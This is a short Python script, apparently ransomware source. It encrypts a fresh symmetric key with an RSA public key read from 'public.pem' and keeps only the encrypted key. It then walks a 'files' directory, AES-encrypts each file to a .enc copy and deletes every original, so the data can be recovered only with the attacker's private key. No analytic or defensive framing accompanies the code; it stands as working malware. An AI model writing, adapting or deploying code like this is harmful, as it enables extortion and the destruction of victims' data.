from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.PublicKey import RSA
from cryptography.fernet import Fernet   # pip3 install cryptography
import os, random, struct, hashlib

def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16)).encode('latin-1')
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def SimpleEncrypt(filename, key):
    f = Fernet(key)

    with open(filename, "rb") as file:
        file_data = file.read()

    encrypted_data = f.encrypt(file_data)

    with open(filename, "wb") as file:
        file.write(encrypted_data)

def main():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        RsaKey = RSA.importKey(open('public.pem').read())
        cipher = PKCS1_OAEP.new(RsaKey)    
        key_file.write( cipher.encrypt(key) )

    password = hashlib.sha256(key).digest()

    for dirpath, dirnames, filenames in os.walk('files'):
        for name in filenames :
            FilePath = os.path.join(dirpath, name)
            # SimpleEncrypt(FilePath, password)
            encrypt_file(password, FilePath)
            os.remove(FilePath)
    

if __name__ == "__main__":
    main()